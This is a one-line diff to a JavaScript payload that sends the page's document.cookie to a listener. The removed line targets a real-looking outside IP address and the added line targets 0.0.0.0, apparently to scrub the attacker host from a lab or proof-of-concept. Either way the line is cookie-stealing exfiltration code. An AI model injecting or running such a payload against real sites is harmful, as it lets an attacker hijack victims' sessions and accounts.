@@ -1,1 +1,1 @@
-fetch("http://138.68.65.187:1234/?c="+document.cookie);
+fetch("http://0.0.0.0:1234/?c="+document.cookie);
